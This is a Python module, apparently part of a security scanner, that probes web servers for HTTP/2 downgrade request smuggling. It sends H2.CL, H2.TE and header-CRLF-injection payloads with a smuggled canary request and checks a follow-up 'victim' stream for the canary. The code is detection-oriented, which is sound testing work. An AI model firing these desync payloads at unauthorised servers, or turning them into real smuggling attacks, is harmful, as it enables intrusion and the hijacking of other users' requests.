"""HTTP/2 downgrade desync probes with cross-stream canary detection."""

from socket import create_connection, socket
from ssl import CERT_NONE, create_default_context
from typing import Dict, List, Optional, Tuple

from h2.config import H2Configuration
from h2.connection import H2Connection
from h2.events import (ResponseReceived, DataReceived, StreamEnded,
                       StreamReset, ConnectionTerminated)

from lib.canary import CanaryGenerator


class H2DesyncProbe:
    def __init__(self, host: str, port: int, use_tls: bool, timeout: float) -> None:
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.canary = CanaryGenerator()

    def _connect(self) -> Tuple[socket, H2Connection]:
        sock = create_connection((self.host, self.port), self.timeout)
        sock.settimeout(self.timeout)
        if self.use_tls:
            ctx = create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
            if sock.selected_alpn_protocol() != "h2":
                sock.close()
                raise OSError("server does not support HTTP/2")
        config = H2Configuration(client_side=True, header_encoding="utf-8",
                                 validate_outbound_headers=False)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        return sock, conn

    def _h2_stream(self, conn: H2Connection, sock: socket, path: str,
                   authority: str, headers: List[Tuple[str, str]],
                   body: bytes = b"", method: str = "POST") -> Dict[str, object]:
        stream_id = conn.get_next_available_stream_id()
        pseudo = [
            (":method", method),
            (":path", path),
            (":scheme", "https" if self.use_tls else "http"),
            (":authority", authority),
        ]
        conn.send_headers(stream_id, pseudo + headers, end_stream=not body)
        if body:
            conn.send_data(stream_id, body, end_stream=True)
        sock.sendall(conn.data_to_send())

        status: Optional[str] = None
        response_body = b""
        ended = False
        try:
            while not ended:
                raw = sock.recv(65535)
                if not raw:
                    break
                events = conn.receive_data(raw)
                for event in events:
                    if isinstance(event, ResponseReceived):
                        for name, value in event.headers:
                            if name == ":status":
                                status = value
                    elif isinstance(event, DataReceived):
                        response_body += event.data
                        conn.acknowledge_received_data(
                            event.flow_controlled_length, event.stream_id)
                    elif isinstance(event, (StreamEnded, StreamReset, ConnectionTerminated)):
                        if hasattr(event, "stream_id") and event.stream_id != stream_id:
                            continue
                        ended = True
        except OSError:
            pass
        return {"status": status, "body": response_body}

    def _probe(self, path: str, host_header: str, probe_type: str,
               headers: List[Tuple[str, str]], body: bytes,
               victim_path: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = f"GET {canary_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
        full_body = body + smuggled.encode("latin-1")
        raw_repr = (
            f"# HTTP/2 {probe_type}\n"
            f"# :path = {path}\n"
            f"# :authority = {host_header}\n"
            f"# headers = {headers}\n"
            f"# body (raw) = {full_body!r}\n"
        ).encode("latin-1", errors="replace")
        try:
            sock, conn = self._connect()
            self._h2_stream(conn, sock, path, host_header, headers, full_body)
            victim_resp = self._h2_stream(
                conn, sock, victim_path, host_header,
                [("content-type", "application/x-www-form-urlencoded")],
                b"", method="GET",
            )
            sock.close()
        except OSError as e:
            return {"type": probe_type, "error": str(e),
                    "desync_suspected": False, "raw": raw_repr}
        victim_body = victim_resp.get("body", b"")
        hit = self.canary.validate(victim_body, canary_path)
        return {
            "type": probe_type,
            "canary_path": canary_path,
            "victim_status": victim_resp.get("status"),
            "victim_body_len": len(victim_body),
            "canary_hit": hit,
            "desync_suspected": hit,
            "raw": raw_repr,
        }

    def probe_h2_cl(self, path: str, host_header: str) -> Dict[str, object]:
        body = b"0\r\n\r\n"
        return self._probe(
            path, host_header, "H2.CL",
            [("content-length", str(len(body) - 1)),
             ("content-type", "application/x-www-form-urlencoded")],
            body, f"{path}?victim=1",
        )

    def probe_h2_te(self, path: str, host_header: str) -> Dict[str, object]:
        return self._probe(
            path, host_header, "H2.TE",
            [("transfer-encoding", "chunked"),
             ("content-type", "application/x-www-form-urlencoded")],
            b"0\r\n\r\n", f"{path}?victim=1",
        )

    def probe_h2_crlf(self, path: str, host_header: str) -> Dict[str, object]:
        return self._probe(
            path, host_header, "H2.CRLF",
            [("foo", "bar\r\nTransfer-Encoding: chunked"),
             ("content-type", "application/x-www-form-urlencoded")],
            b"0\r\n\r\n", f"{path}?victim=1",
        )

    def run_all(self, path: str, host_header: str) -> List[Dict[str, object]]:
        results = []
        for fn in (self.probe_h2_cl, self.probe_h2_te, self.probe_h2_crlf):
            try:
                results.append(fn(path, host_header))
            except OSError:
                results.append({"type": fn.__name__, "error": "connection_failed",
                                "desync_suspected": False})
        return results